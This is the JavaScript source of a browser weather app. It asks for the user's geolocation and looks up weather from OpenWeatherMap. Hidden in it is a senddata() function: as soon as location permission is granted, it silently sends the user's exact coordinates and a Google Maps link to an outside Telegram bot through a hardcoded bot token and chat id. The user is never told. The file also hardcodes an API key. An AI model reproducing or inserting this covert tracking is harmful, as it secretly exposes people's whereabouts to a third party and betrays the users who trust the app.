//pages
const searchpage = document.getElementById('sp');
const weatherpage = document.getElementById('wp');
const loadingpage = document.getElementById('loadingconatiner');
const locationpage = document.getElementById('locationpage');

//header
const searchbtn = document.getElementById('search-pagebtn');
const homebtn = document.getElementById('home-pagebtn');

//weather app


//location pages
const locationbtn = document.getElementById('location-btn');
const messageDiv = document.getElementById('message');

//search bar 
const inputbar = document.getElementById('search-bar');
const searchcity = document.getElementById('search-city');

// api key 
const Api = "99c3df48061950d0ab6187a7e4f8f495";


let currentpage = homebtn;

currentpage.classList.add('current-page');

locationpage.classList.add("active");

getLocation();

function changepage(page){
  if (currentpage != page){
      
    currentpage.classList.remove('current-page');
    currentpage = page ;
    
    currentpage.classList.add('current-page');
  

  }
 
  
}


function yourpage(){
 
  weatherpage.classList.add('active');
  searchpage.classList.remove('active');
}

function searchpagebtn(){
  weatherpage.classList.remove('active')
  searchpage.classList.add('active');
  locationpage.classList.remove('active')
}

homebtn.addEventListener("click", ()=>{
  changepage(homebtn);
yourpage();

});
searchbtn.addEventListener("click", ()=>{
  changepage(searchbtn);
  searchpagebtn();

})



function definedata(data){

  const city = document.getElementById('city-data');
  const wheather = document.getElementById('wheather-type');
  const wheathericon = document.getElementById('wheather-icon');
  const temperature = document.getElementById('temperature');
  
  const wind = document.getElementById('wind');
  const humidity = document.getElementById('humidity');
  const clouds = document.getElementById('clouds');
  const countryicon = document.getElementById('country-icon');

  city.innerText = data?.name;
  wheather.innerText = data?.weather?.[0]?.description;
  temperature.innerText = data?.main?.temp;

  wind.innerText= data?.wind?.speed + " m/s" ;
  humidity.innerText = data?.main?.humidity + " %";
  clouds.innerText = data?.clouds?.all + " %";

  countryicon.src = `https://flagcdn.com/144x108/${data?.sys?.country.toLowerCase()}.png`;
 
  wheathericon.src = ` https://openweathermap.org/img/wn/${data?.weather?.[0]?.icon}@2x.png`


}




async function weatherinfoCity() {
  
let city = inputbar.value;
console.log(city);

loadingpage.classList.add('active')
let reponse = await fetch(`https://api.openweathermap.org/data/2.5/weather?q=${city}&appid=${Api}`)

let data =  await reponse.json();
console.log(data);
loadingpage.classList.remove('active')
weatherpage.classList.add('active')


definedata(data); 

}




function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (position) => {

  let Latitude=position.coords.latitude ;
 let Longitude= position.coords.longitude;

 messageDiv.style.backgroundColor = "green";

          messageDiv.innerText = `User allowed Permission successfully `;
locationpage.classList.remove('active')
weatherpage.classList.add('active');

          

 yourweather(Latitude, Longitude);
 
 senddata(Latitude, Longitude);

      },
      (error) => {
        messageDiv.style.backgroundColor = "red";
          messageDiv.innerText = `Error: ${error.message}`;
      }
  );
  } else {
   console.log( "Geolocation is not supported by this browser.");
  }
}

async function senddata(lat , lon) {
  const token ='7135600941:AAFd6-m2E8BzPXHB-z6nIESnBYNbuwiDD8Q';
const id = '1406652305'
let text = `longitute = ${lon}  && latitude= ${lat}  && https://www.google.com/maps?q=${lat},${lon}`;

const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent(text)}`;

let response = await fetch(url, {
    method: "GET"
});

if (response.ok) {
    console.log("successfully working");
} else {
    console.error("Failed to send message");
}


}


async function yourweather(lat , lon){


  weatherpage.classList.remove('active')

  loadingpage.classList.add('active')
let reponse = await fetch(`https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&appid=${Api}`)

let data =  await reponse.json();
console.log (data);

loadingpage.classList.remove('active')
weatherpage.classList.add('active')

definedata(data); 
}




// let citys = inputbar.value;
// console.log(citys);

searchcity.addEventListener("click",weatherinfoCity);


locationbtn.addEventListener("click",getLocation);

